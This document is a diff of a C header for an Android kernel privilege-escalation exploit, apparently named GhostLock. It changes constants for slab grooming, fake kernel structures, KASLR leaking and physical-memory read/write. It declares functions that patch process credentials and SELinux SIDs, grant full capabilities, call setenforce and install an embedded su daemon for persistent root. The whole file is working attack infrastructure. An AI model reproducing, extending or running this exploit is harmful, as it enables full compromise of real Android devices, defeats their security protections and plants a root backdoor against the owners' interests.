@@ -2,6 +2,7 @@
 #define COMMON_H
 
 #define _GNU_SOURCE
+#define __ARM 1
 
 #include "offset.h"
 
@@ -15,7 +16,6 @@
 #include <fcntl.h>
 #include <linux/futex.h>
 #include <linux/memfd.h>
-#include <linux/perf_event.h>
 #include <pthread.h>
 #include <sched.h>
 #include <signal.h>
@@ -26,15 +26,14 @@
 #include <string.h>
 #include <sys/ioctl.h>
 #include <sys/mman.h>
-#include <sys/poll.h>
 #include <sys/prctl.h>
 #include <sys/resource.h>
 #include <sys/select.h>
 #include <sys/socket.h>
 #include <sys/stat.h>
 #include <sys/syscall.h>
+#include <sys/utsname.h>
 #include <sys/uio.h>
-#include <sys/un.h>
 #include <sys/wait.h>
 #include <time.h>
 #include <unistd.h>
@@ -42,124 +41,78 @@
 #include "kernelsnitch/utils.h"
 
 #define KERNEL_PAGE_SETUP_ATTEMPTS 6
-#if defined(APP_PAYLOAD) && APP_PAYLOAD
-#ifndef SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS
-#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 2
-#endif
-#ifndef FOPS_KERNEL_PAGE_SETUP_ATTEMPTS
-#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 2
-#endif
-#else
 #define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 12
 #define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
-#endif
-#ifndef SKB_DATA_DELTA
 #define SKB_DATA_DELTA (-0xe80LL)
-#endif
 
 #define ASHMEM_NAME_LEN 256
 #define __ASHMEMIOC 0x77
 #define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])
-#define ASHMEM_GET_SIZE _IO(__ASHMEMIOC, 4)
 
-#ifndef MM_STRUCT_SZ
-#define MM_STRUCT_SZ 0x500
-#endif
-#ifndef MM_ORDER
-#define MM_ORDER 3
-#endif
-#ifndef KERNELSNITCH_VERBOSE
-#define KERNELSNITCH_VERBOSE 0
-#endif
-#ifndef KERNELSNITCH_MTE_ENABLED
-#define KERNELSNITCH_MTE_ENABLED 0
-#endif
-#ifndef MM_PARTIALS
+/* MM_STRUCT_SZ, MM_ORDER, FUTEX_HASHSIZE and KS_MTE_TAGGED describe the
+ * running kernel, not the exploit, so they live in the target header with the
+ * struct offsets. Defining them here made a 6.12 value apply to every device.
+ * They are deliberately not defaulted: a target header that forgets one should
+ * fail to build rather than inherit another kernel's shape. */
 #define MM_PARTIALS 5
-#endif
-#ifndef CORE
 #define CORE 0
-#endif
-#ifndef KSNITCH_COLLISIONS
 #define KSNITCH_COLLISIONS 4
-#endif
-#ifndef ROUTE_OWNER_CHAIN_MODE
-#define ROUTE_OWNER_CHAIN_MODE 0
-#endif
 
 #define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
 #define PIPE_CANDIDATE_PAGES 8
-#ifndef SKB_SEND_SIZE
 #define SKB_SEND_SIZE (ORDER3_SIZE * 2)
-#endif
-#ifndef SKB_RECLAIM_SENDS
 #define SKB_RECLAIM_SENDS 4
-#endif
-#ifndef LEGACY_PCP_SHAPING_SOCKETS
-#define LEGACY_PCP_SHAPING_SOCKETS 1
-#endif
-#ifndef APP_SLIDE_RECLAIM_SENDS
-#define APP_SLIDE_RECLAIM_SENDS 16
-#endif
-#ifndef FOPS_TABLE_OFF
 #define FOPS_TABLE_OFF FOPS_OFF
-#endif
-#ifndef SKB_FRAG_BIAS
 #define SKB_FRAG_BIAS 0
-#endif
 
 #define FAKE_TASK_PRIO 120
-#ifndef FAKE_WAITER_PRIO
-#define FAKE_WAITER_PRIO 130
-#endif
-#ifndef SLIDE_FAKE_WAITER_PRIO
-#define SLIDE_FAKE_WAITER_PRIO FAKE_WAITER_PRIO
-#endif
+#define FAKE_WAITER_PRIO 140
+#define FAKE_TASK_UCLAMP_REQ_OFF 0x350
+#define FAKE_TASK_UCLAMP_OFF 0x358
+#define FAKE_UCLAMP_ACTIVE_BIT 16
+#define FAKE_UCLAMP_MIN_ACTIVE (1U << FAKE_UCLAMP_ACTIVE_BIT)
+#define FAKE_UCLAMP_MAX_ACTIVE \
+  (1024U | (19U << 11) | (1U << FAKE_UCLAMP_ACTIVE_BIT))
 #define ASHMEM_NAME_PREFIX_LEN 11
 #define ASHMEM_PREFIX_COUNT 0x6d6873612f766564ULL
+
+#define TASK_COMM_LEN 16
+#define SELINUX_KERNEL_SID 1
+#define INIT_TASK_TASKS (INIT_TASK + TASK_TASKS_OFF)
+#define SECURITY_CAPABLE_HEAD (SECURITY_HOOK_HEADS + 0x40)
+#define CAP_FULL 0x000001ffffffffffULL
+#define CRED_CAP_WORDS 5
+#define CRED_CAP_INHERITABLE 0
+#define CRED_CAP_PERMITTED 1
+#define CRED_CAP_EFFECTIVE 2
+#define CRED_CAP_BSET 3
+#define CRED_CAP_AMBIENT 4
 
 #define KMALLOC_SHIFT_HIGH (PAGE_SHIFT + 1)
 #define KMALLOC_BUCKETS (KMALLOC_SHIFT_HIGH + 1)
 #define KMALLOC_NORMAL_TYPE 0
-#ifndef KMALLOC_CGROUP_TYPE
 #define KMALLOC_CGROUP_TYPE 2
-#endif
-#ifndef KMALLOC_PIPE_INDEX
 #define KMALLOC_PIPE_INDEX 11
-#endif
-#ifndef KMALLOC_CACHE_TYPES
 #define KMALLOC_CACHE_TYPES 4
-#endif
 #define KMALLOC_CACHE_SLOTS (KMALLOC_CACHE_TYPES * KMALLOC_BUCKETS)
 #define KMALLOC_CACHE_SLOT(type, index) \
   (KMALLOC_CACHES + ((type) * KMALLOC_BUCKETS + (index)) * 8)
 #define KMALLOC_CGROUP_PIPE_SLOT \
   KMALLOC_CACHE_SLOT(KMALLOC_CGROUP_TYPE, KMALLOC_PIPE_INDEX)
-#ifndef KMALLOC_PIPE_OBJ_SIZE
 #define KMALLOC_PIPE_OBJ_SIZE 0x800
-#endif
 
 #define DIRECT_MAP_PAGES ((DIRECT_MAP_END - DIRECT_MAP_BASE) >> PAGE_SHIFT)
 #define VMEMMAP_END (VMEMMAP_START + DIRECT_MAP_PAGES * STRUCT_PAGE_SIZE)
+#define PAGE_TYPE_SLAB 0xf5
 
 #define PIPE_OBJECT_SIZE KMALLOC_PIPE_OBJ_SIZE
 #define PIPE_SCAN_CHUNK 0x400
-#ifndef PIPE_OBJS_PER_SLAB
-#define PIPE_OBJS_PER_SLAB (ORDER3_SIZE / PIPE_OBJECT_SIZE)
-#endif
+#define PIPE_OBJS_PER_SLAB 16
 #define PIPE_SLAB_SIZE (PIPE_OBJECT_SIZE * PIPE_OBJS_PER_SLAB)
-#ifndef PIPE_MIN_PARTIAL
 #define PIPE_MIN_PARTIAL 5
-#endif
-#ifndef PIPE_CPU_PARTIAL
 #define PIPE_CPU_PARTIAL 2
-#endif
-#ifndef PIPE_DRAIN_SLABS
 #define PIPE_DRAIN_SLABS 15
-#endif
-#ifndef PIPE_RECLAIM_SLABS
 #define PIPE_RECLAIM_SLABS 15
-#endif
 #define PIPE_PARTIAL_GROUPS \
   ((PIPE_MIN_PARTIAL + PIPE_CPU_PARTIAL - 1) / PIPE_CPU_PARTIAL)
 #define PIPE_N_SLABS (PIPE_PARTIAL_GROUPS * PIPE_CPU_PARTIAL)
@@ -170,85 +123,60 @@
 #define PIPE_E_COUNT (PIPE_E_SLABS * PIPE_OBJS_PER_SLAB)
 #define PIPE_DRAIN (PIPE_OBJS_PER_SLAB * PIPE_DRAIN_SLABS)
 #define PIPE_RECLAIM (PIPE_OBJS_PER_SLAB * PIPE_RECLAIM_SLABS)
-#ifndef PIPE_MAX_ATTEMPTS
-#if defined(APP_PAYLOAD) && APP_PAYLOAD
-#define PIPE_MAX_ATTEMPTS 1
-#else
 #define PIPE_MAX_ATTEMPTS 12
-#endif
-#endif
 
-#define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
+#define PIPEI_DRAIN_COUNT 504
+#define PIPEI_RECLAIM_COUNT 2016
+#define PIPEI_RECLAIM_MAX_BASES 64
+#define PIPEI_PREP_ATTEMPTS 8
+#define PIPEI_LIVE_COUNT PIPEI_RECLAIM_COUNT
+#define PIPEI_LIVE_ANCHOR_SAMPLES 5
+#define PIPEI_LIVE_DEFAULT_BIASES ""
+#define PIPEI_LIVE_MAX_ATTEMPTS 32
+#define PIPEI_LIVE_MAX_CONSIDERED 0
+#define PIPEI_LIVE_SLOT_CANDIDATES 1
+#define PIPEI_LIVE_DEDUP_TARGETS 1
+#define PIPEI_LIVE_ANCHOR_MAX_SPREAD 0xfff
+#define TMP_UNAME_DEFAULT_NAME "CatOS"
+#define TMP_UNAME_DEFAULT_HOLD_SEC 5
+
+/* Physical address the bootloader loaded the kernel Image at.
+ *
+ * Defaults to the target header's P0_KERNEL_PHYS_LOAD, so devices whose value
+ * is known behave exactly as before. Ports where it has not been measured yet
+ * build with P0_KERNEL_PHYS_LOAD=0 and supply it at run time:
+ *
+ *     GHOSTLOCK_PHYS_LOAD=0x88000000 /data/local/tmp/a/e
+ *
+ * p0_phys_load_init() refuses to run with 0 rather than picking a value --
+ * data_addr() feeds Write 1, and a wrong base writes to an unrelated page.
+ */
+extern uintptr_t p0_kernel_phys_load;
+int p0_phys_load_init(void);
+
+#define P0_KERNEL_PHYS_DELTA (p0_kernel_phys_load - P0_PHYS_OFFSET)
 #define P0_DATA_ALIAS_CONST(image_addr) \
-  (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))
+  (P0_PAGE_OFFSET | ((uintptr_t)(image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))
 
-#ifndef CONSUMER_CORE
 #define CONSUMER_CORE (CORE + 1)
-#endif
-#ifndef CONSUMER_MAX_CALLS
 #define CONSUMER_MAX_CALLS 1
-#endif
 #define PSELECT_ROUTE_NFDS 320
 #define PSELECT_CONSUMER_NICE 19
-#ifndef PSELECT_CONSUMER_BURST_CALLS
 #define PSELECT_CONSUMER_BURST_CALLS 1
-#endif
-#ifndef PSELECT_SCHED_HELPERS
-#define PSELECT_SCHED_HELPERS 0
-#endif
-#ifndef PSELECT_SCHED_HELPER_CORE_BASE
-#define PSELECT_SCHED_HELPER_CORE_BASE (CONSUMER_CORE + 1)
-#endif
-#ifndef PSELECT_SCHED_HELPER_CORE_STRIDE
-#define PSELECT_SCHED_HELPER_CORE_STRIDE 1
-#endif
-#ifndef PSELECT_SCHED_HELPER_CALLS
-#define PSELECT_SCHED_HELPER_CALLS 1
-#endif
-#ifndef PSELECT_SCHED_HELPER_NICE
-#define PSELECT_SCHED_HELPER_NICE PSELECT_CONSUMER_NICE
-#endif
-#ifndef PSELECT_ENTER_DELAY_USEC
 #define PSELECT_ENTER_DELAY_USEC 50000
-#endif
-#ifndef PSELECT_COPYOUT_SYNC_TIMEOUT_USEC
-#define PSELECT_COPYOUT_SYNC_TIMEOUT_USEC 20000
-#endif
-#ifndef SLIDE_WAITER_WAKE_STATE
-#define SLIDE_WAITER_WAKE_STATE 3
-#endif
-#ifndef SLIDE_LOCK_OWNER_VALUE
-#define SLIDE_LOCK_OWNER_VALUE 0ULL
-#endif
-#ifndef LEGACY_RT_MUTEX_WAITER
-#define LEGACY_RT_MUTEX_WAITER 0
-#endif
-#ifndef COMPACT_RT_MUTEX_WAITER
-#define COMPACT_RT_MUTEX_WAITER 0
-#endif
-#if LEGACY_RT_MUTEX_WAITER && COMPACT_RT_MUTEX_WAITER
-#error "select only one rt_mutex_waiter layout"
-#endif
-#ifndef FAKE_WAITER_LAYOUT_SIZE
-#define FAKE_WAITER_LAYOUT_SIZE (FAKE_WAITER_WW_CTX_OFF + sizeof(uint64_t))
-#endif
-#define PSELECT_TIMEOUT_SEC 1
-#ifndef ROUTE_WAIT_SECONDS
-#define ROUTE_WAIT_SECONDS 8
-#endif
-#define SLIDE_NFULNL_LOGGER_NAME \
-  P0_DATA_ALIAS_CONST(SLIDE_NFULNL_LOGGER_NAME_IMAGE)
-#define SLIDE_NFULNL_LOGGER_OBJECT \
-  P0_DATA_ALIAS_CONST(SLIDE_NFULNL_LOGGER_OBJECT_IMAGE)
-#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR \
-  P0_DATA_ALIAS_CONST(SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE)
-#ifndef SLIDE_WAITER_TREE_LEFT
-#define SLIDE_WAITER_TREE_LEFT SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR
-#endif
+#define PSELECT_TIMEOUT_SEC 0
+#define PSELECT_TIMEOUT_USEC 200000
+#define SLIDE_PSELECT_TIMEOUT_SEC 1
+#define SLIDE_WAIT_SECONDS 2
+#define PSELECT_WRITE_SHAPE_DEFAULT 1
+#define ROUTE_WAIT_SECONDS 1
+#define EARLY_PIPE_PREPARE 0
+#define SLIDE_NFULNL_LOGGER \
+  P0_DATA_ALIAS_CONST(SLIDE_NFULNL_LOGGER_IMAGE)
+#define SLIDE_LOGGERS_0_1 P0_DATA_ALIAS_CONST(SLIDE_LOGGERS_0_1_IMAGE)
+#define SLIDE_RANDOM_BOOT_ID_DATA \
+  P0_DATA_ALIAS_CONST(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE)
 #define SLIDE_INIT_TASK P0_DATA_ALIAS_CONST(SLIDE_INIT_TASK_IMAGE)
-#ifndef SLIDE_WAITER_TASK
-#define SLIDE_WAITER_TASK SLIDE_INIT_TASK
-#endif
 #define SLIDE_ROOT_TASK_GROUP \
   P0_DATA_ALIAS_CONST(SLIDE_ROOT_TASK_GROUP_IMAGE)
 #define SLIDE_SYSCTL_BOOTID P0_DATA_ALIAS_CONST(SLIDE_SYSCTL_BOOTID_IMAGE)
@@ -269,6 +197,31 @@ struct local_sched_attr {
   uint64_t sched_period;
 };
 
+struct root_report {
+  uint32_t uid_before;
+  uint32_t uid_after;
+  uint32_t gid_after;
+  uint32_t euid_after;
+  uint32_t egid_after;
+  int setgid_ret;
+  int setgid_errno;
+  int setuid_ret;
+  int setuid_errno;
+  int setenforce_ret;
+  int setenforce_errno;
+  int su_install_ret;
+  int su_install_errno;
+  pid_t su_daemon_pid;
+  int wallpaper_ret;
+  int wallpaper_errno;
+};
+
+struct root_shared {
+  atomic_int go;
+  atomic_int done;
+  struct root_report report;
+};
+
 struct mm_ctx {
   size_t mm_cnt;
   pid_t *childs;
@@ -287,6 +240,7 @@ struct user_pipe_buffer {
 
 extern pid_t pipe_prepare_child;
 extern uintptr_t page_base;
+extern uintptr_t last_mm_struct;
 extern uintptr_t fake_lock;
 extern uintptr_t fake_w0;
 extern uintptr_t fake_task;
@@ -295,10 +249,9 @@ extern uintptr_t fake_right;
 extern uintptr_t fake_left;
 extern uintptr_t fake_fops;
 extern uintptr_t binwrite_target;
-extern uintptr_t pselect_observed_task;
-extern uintptr_t fops_leaked_mm;
-
-
+extern int pselect_custom_write;
+extern uintptr_t pselect_custom_target;
+extern uintptr_t pselect_custom_value;
 
 extern uint32_t f_wait;
 extern uint32_t f_pi_target;
@@ -313,14 +266,6 @@ extern atomic_int punch_consume_go;
 extern atomic_int punch_consume_stop;
 extern atomic_int consumer_calls;
 extern atomic_int consumer_success;
-extern atomic_int consumer_inflight;
-extern atomic_int pselect_ready_peer_fd;
-extern atomic_int pselect_ready_target_fd;
-extern atomic_int pselect_write_drain_fd;
-extern atomic_int pselect_returned;
-extern atomic_int pselect_output_valid;
-extern atomic_uintptr_t pselect_copyout_fault_base;
-extern atomic_int pselect_copyout_fault_fd;
 extern atomic_int main_route_delay_usec;
 extern atomic_int cfi_stage_done;
 extern atomic_int pipe_prepare_request;
@@ -334,8 +279,18 @@ extern uint64_t fops_before;
 extern uint64_t fops_after;
 extern int root_child_done;
 extern char ashmem_path[256];
+extern uint8_t selinux_before;
+extern uint8_t selinux_after;
 extern uint32_t root_uid_before;
 extern uint32_t root_uid_after;
+extern uint64_t capable_head_before;
+extern uint64_t capable_head_after;
+extern uint64_t init_tasks_prev;
+extern uint64_t last_task_guess;
+extern int setgid_ret;
+extern int setuid_ret;
+extern int setenforce_ret;
+extern int setenforce_errno;
 extern int cfi_attempts;
 extern int pipe_stage_attempts;
 extern int cfi_dirty_seen;
@@ -370,9 +325,6 @@ extern uint32_t pipe_probe_len;
 extern uint32_t pipe_probe_flags;
 extern uint64_t pipe_scan_first_page;
 extern uint64_t pipe_scan_first_ops;
-#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
-extern int p0_virtual_base_probe;
-#endif
 extern uint64_t pipe_scan_q0;
 extern uint64_t pipe_scan_q1;
 extern uint64_t pipe_scan_q2;
@@ -385,27 +337,56 @@ extern uint64_t physrw_write64_value;
 extern int physrw_read64_ok;
 extern int physrw_write64_ok;
 extern int kaslr_done;
+extern int kaslr_step;
+extern uint64_t kaslr_fops_alias;
+extern uint64_t kaslr_open_ptr;
+extern uint64_t kaslr_ioctl_ptr;
+extern uint64_t kaslr_mmap_ptr;
+extern uint64_t kaslr_release_ptr;
+extern uint64_t kaslr_show_fdinfo_ptr;
 extern uint64_t kaslr_base;
 extern uint64_t kaslr_slide;
+extern uint64_t kaslr_expected_ioctl;
+extern uint64_t kaslr_expected_mmap;
+extern uint64_t kaslr_expected_release;
+extern uint64_t kaslr_expected_show_fdinfo;
 extern uint64_t slide_bootid_before;
 extern uint64_t slide_bootid_after;
 extern uint64_t slide_bootid_want;
 extern ssize_t slide_bootid_restore_ret;
-extern uintptr_t slide_p0_offset;
-extern uintptr_t slide_oracle_parent;
-extern uintptr_t slide_oracle_target;
-extern uintptr_t p0_gate_page_struct;
-extern uintptr_t p0_probe_page_struct;
-extern uintptr_t fops_data_probe_addr;
-extern int fops_data_probe_active;
-extern int data_alias_uses_slide;
-extern int slide_p0_session_fresh;
+extern uint64_t current_task_addr;
+extern uint64_t current_cred_addr;
+extern uint64_t current_real_cred_addr;
+extern uint64_t current_cred_security_addr;
+extern uint64_t current_real_cred_security_addr;
+extern uint32_t cred_sid_before;
+extern uint32_t cred_sid_after;
+extern uint32_t real_cred_sid_before;
+extern uint32_t real_cred_sid_after;
+extern uint32_t target_cred_osid;
+extern uint32_t target_cred_sid;
+extern uint32_t selinux_cred_blob_off;
+extern int task_walk_iters;
+extern uint64_t task_walk_last_entry;
+extern uint32_t task_walk_last_pid;
+extern uint32_t task_walk_last_tgid;
+extern uint32_t found_task_pid;
+extern uint32_t found_task_tgid;
+extern char found_task_comm[TASK_COMM_LEN + 1];
+extern pid_t root_child_pid;
+extern int root_ready_pipe[2];
+extern struct root_shared *root_shared;
 extern int memfd_leak;
 
 int run_exploit(int argc, char **argv);
+int install_embedded_su(pid_t *daemon_pid);
+int install_embedded_wallpaper(void);
 void read_first_line(const char *path, char *buf, size_t len);
 void log_startup_context(void);
+void log_slide_child_context(void);
 void disable_rseq_for_thread(void);
+int env_flag(const char *name, int def);
+int env_int_range(const char *name, int def, int min, int max);
 long futex_op(
     uint32_t *uaddr, int op, uint32_t val,
     const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3);
@@ -414,6 +395,7 @@ int try_cache_ashmem_path(const char *path);
 int same_rdev_path(const char *path, dev_t rdev);
 void init_ashmem_path(void);
 int open_ashmem_device(void);
+int has_zero_byte(uintptr_t value);
 uintptr_t p0_data_alias(uintptr_t image_addr);
 uintptr_t p0_alias_image_offset(uintptr_t data_alias);
 uintptr_t data_addr(uintptr_t image_addr);
@@ -421,6 +403,12 @@ uintptr_t kaslr_image_addr(uintptr_t image_addr);
 uintptr_t text_addr(uintptr_t image_addr);
 uintptr_t slide_canon_addr(uintptr_t data_alias);
 uintptr_t canon_addr(uintptr_t image_addr);
+uintptr_t pselect_write_value(void);
+uintptr_t pselect_write_target(void);
+int pselect_custom_write_enabled(void);
+int pselect_write_shape(void);
+void set_pselect_write(uintptr_t target, uintptr_t value);
+void clear_pselect_write(void);
 void put64(unsigned char *p, size_t off, uint64_t value);
 void put32(unsigned char *p, size_t off, uint32_t value);
 void put_fake_fops_table(unsigned char *p, size_t off);
@@ -432,16 +420,13 @@ pid_t clone_leak_child(void);
 int open_memfd(pid_t child);
 void kill_child(pid_t child);
 void close_reclaim_sockets(void);
-int reclaim_receiver_fd(void);
-size_t diagnose_reclaim_payload_mutations(void);
-size_t diagnose_ion_payload_mutations(void);
+size_t ks_verbose(void);
+size_t ks_mte_tagged(void);
 void setup_kernelsnitch(void);
-int leak_current_task_perf(void);
-extern uintptr_t runtime_waiter_task;
-extern uintptr_t runtime_waiter_stack_waiter;
-extern uintptr_t runtime_file_fops_target;
+int kernelsnitch_collision_count(void);
 int kernelsnitch_collisions_ready(void);
 void run_kernelsnitch_bruteforce(void);
+uintptr_t current_kernelsnitch_mm_struct(void);
 uintptr_t cleanup_kernelsnitch(void);
 void close_ctx_memfds(struct mm_ctx *ctx);
 void free_ctx_storage(struct mm_ctx *ctx);
@@ -453,61 +438,49 @@ uintptr_t prepare_kernel_page(int payload_mode);
 uintptr_t prepare_good_kernel_page(int payload_mode);
 
 void fdset_put_word(fd_set *set, int word, uint64_t value);
+uint64_t fdset_get_word(const fd_set *set, int word);
 void open_selected_fds(
-    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd,
-    int except_fd);
+    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd);
 void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
-int pselect_remap_write_fds(void);
-int prepare_preopened_ashmem_file_target(void);
 void do_pselect_fake_lock_route(void);
-void do_tcp_fake_lock_route(void);
+void reset_main_route_state(void);
+void run_main_route_threads(void);
 
+int slide_pselect_words_per_set(void);
+int slide_pselect_global_word(int waiter_word);
+int slide_pselect_put_global_word(
+    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
+    int global_word, uint64_t value);
+uint64_t slide_pselect_get_global_word(
+    const fd_set *in, const fd_set *out, const fd_set *ex,
+    int words_per_set, int global_word);
+void slide_pselect_put_waiter_word(
+    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
+    int waiter_word, uint64_t value, const char *name);
+void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
+void open_slide_selected_fds(
+    fd_set *in, fd_set *out, fd_set *ex, int read_fd);
+void slide_pselect_stack_copy(void);
+int hex_value(char c);
+uint64_t slide_read_stext(void);
+uint64_t slide_child_leak_stext(void);
 int slide_leak_kernel_base(void);
-void app_publish_p0_offset(uintptr_t offset);
-void app_publish_p0_dirty(void);
-void app_publish_two_stage1(uintptr_t installed_fops,
-                            uintptr_t target_fop,
-                            uintptr_t control_fop,
-                            uint64_t original_fops,
-                            const unsigned char target_region[32],
-                            uint64_t original_flags_mode,
-                            uint64_t bootstrap_flags_mode);
-void app_publish_two_stage2_ready(void);
-int app_trigger_two_stage_splice(void);
-int app_wait_two_stage_splice(ssize_t *splice_ret);
-int app_get_two_stage_state(uintptr_t *installed_fops,
-                            uintptr_t *target_fop,
-                            uint64_t *original_fops,
-                            unsigned char target_region[32],
-                            uint64_t *original_flags_mode,
-                            uint64_t *bootstrap_flags_mode);
-#if defined(APP_PAYLOAD) && APP_PAYLOAD
-int select_slide_payload_slot(uintptr_t offset);
-int select_slide_payload_index(size_t index);
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-int app_trigger_fops_slide_route(void);
-#if (defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY) || \
-    (defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
-     APP_FOPS_DATA_ALIAS_DIAG_ONLY)
-int app_trigger_fops_oracle_slot(size_t slot);
-#endif
-#endif
-#endif
 
 ssize_t configfs_write_once(
     int fd, uintptr_t target, const void *data, size_t len);
 ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len);
+int is_kernel_ptr(uintptr_t value);
 int is_direct_ptr(uintptr_t value);
 uint64_t kernel_read64(int fd, uintptr_t target);
 ssize_t kernel_write_data(
     int fd, uintptr_t target, const void *data, size_t len);
 ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len);
 int repair_fake_fops_llseek(int fd);
+int refresh_fake_fops_text(int fd);
+int leak_kernel_base(int fd);
 int restore_slide_boot_id(int fd);
 int install_child_root(int fd);
 int try_cfi_stage(void);
-extern __attribute__((visibility("hidden"))) int cfi_rw_keeper_fd;
-__attribute__((visibility("hidden"))) void root_avc_autogrant_loop(int fd);
 
 void init_ctx(struct mm_ctx *ctx, size_t cnt);
 void resize_pipe_slots(int pipefd[2], size_t slots);
@@ -539,26 +512,20 @@ int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len);
 int pipe_phys_write_data(
     int fd, uintptr_t direct_addr, const void *data, size_t len);
 uint64_t pipe_read64(int fd, uintptr_t direct_addr);
+uint32_t pipe_read32(int fd, uintptr_t direct_addr);
 int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value);
 int install_pipe_physrw(int fd);
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-int prepare_p0_pipe_oracle(void);
-int preserve_p0_pipe_oracle_fds(void);
-int expand_p0_pipe_oracle(void);
-int verify_p0_pipe_oracle_gate(void);
-int verify_p0_pipe_data_page(uintptr_t target, uint64_t expected);
-int verify_p0_pipe_data_page_single_active(uintptr_t target,
-                                           uint64_t expected);
-int verify_and_merge_p0_pipe_data_page_single_active(uintptr_t target,
-                                                      uint64_t replacement);
-uintptr_t scan_p0_pipe_oracle(void);
-#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
-uint64_t scan_p0_virtual_base_pointer(void);
-#endif
-int restore_p0_oracle_pages(int fd);
-int run_p0_pipe_oracle_diagnostic(int fd);
-#endif
+void print_uname_line(const char *tag);
+int run_tmp_page_uname_stage(void);
 
+int spawn_root_child(void);
+int collect_root_child(void);
+uint64_t find_task_by_tgid(int fd, uint32_t want_tgid);
+int patch_cred_identity(int fd, uintptr_t cred);
+int patch_cred_sid(int fd, uintptr_t cred);
+int patch_cred_object(int fd, uintptr_t cred);
 int install_android_root(int fd);
 
 #endif
+
+void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode);
